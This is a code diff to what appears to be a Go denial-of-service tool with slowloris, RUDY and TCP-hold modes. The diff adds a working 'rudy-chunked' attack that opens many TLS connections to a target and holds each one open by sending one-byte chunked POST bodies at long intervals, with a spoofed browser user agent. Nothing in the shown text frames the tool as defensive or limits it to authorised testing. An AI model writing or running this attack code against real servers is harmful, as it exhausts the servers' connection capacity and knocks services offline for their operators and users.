@@ -216,8 +216,12 @@ func main() {
 	switch *mode {
 	case "slowloris":
 		slowloris(deadline)
-	case "rudy":
-		rudy(deadline)
+	case "rudy", "rudy-chunked":
+		if *mode == "rudy-chunked" {
+			rudyChunked(deadline)
+		} else {
+			rudy(deadline)
+		}
 	case "tcphold":
 		tcpHold(deadline)
 	default:
@@ -388,6 +392,61 @@ func tcpHoldWorker(id int, deadline time.Time) {
 		conn.SetReadDeadline(readDeadline)
 		buf := make([]byte, 1)
 		conn.Read(buf)
+		conn.Close()
+		atomic.AddUint64(&disconns, 1)
+	}
+}
+
+// ========== RUDY Chunked ==========
+
+func rudyChunked(deadline time.Time) {
+	var wg sync.WaitGroup
+	for i := 0; i < *workers; i++ {
+		wg.Add(1)
+		go func(id int) {
+			defer wg.Done()
+			rudyChunkedWorker(id, deadline)
+		}(i)
+	}
+	wg.Wait()
+}
+
+func rudyChunkedWorker(id int, deadline time.Time) {
+	conf := tlsConfig()
+	dialer := getDialer()
+	header := fmt.Sprintf(
+		"POST %s HTTP/1.1\r\nHost: %s\r\nTransfer-Encoding: chunked\r\nContent-Type: application/x-www-form-urlencoded\r\nUser-Agent: Mozilla/5.0 Chrome/121.0.0.0\r\nAccept: */*\r\n\r\n",
+		*path, *sni)
+	chunk := []byte("1\r\nX\r\n")
+
+	for time.Now().Before(deadline) {
+		raw, err := dialer.Dial("tcp", *target)
+		if err != nil {
+			time.Sleep(2 * time.Second)
+			continue
+		}
+		conn := tls.Client(raw, conf)
+		if err := conn.Handshake(); err != nil {
+			raw.Close()
+			time.Sleep(2 * time.Second)
+			continue
+		}
+
+		atomic.AddUint64(&connects, 1)
+
+		if _, err := conn.Write([]byte(header)); err != nil {
+			conn.Close()
+			atomic.AddUint64(&disconns, 1)
+			continue
+		}
+
+		for time.Now().Before(deadline) {
+			if _, err := conn.Write(chunk); err != nil {
+				break
+			}
+			atomic.AddUint64(&bytesSent, uint64(len(chunk)))
+			time.Sleep(time.Duration(*delay) * time.Second)
+		}
 		conn.Close()
 		atomic.AddUint64(&disconns, 1)
 	}
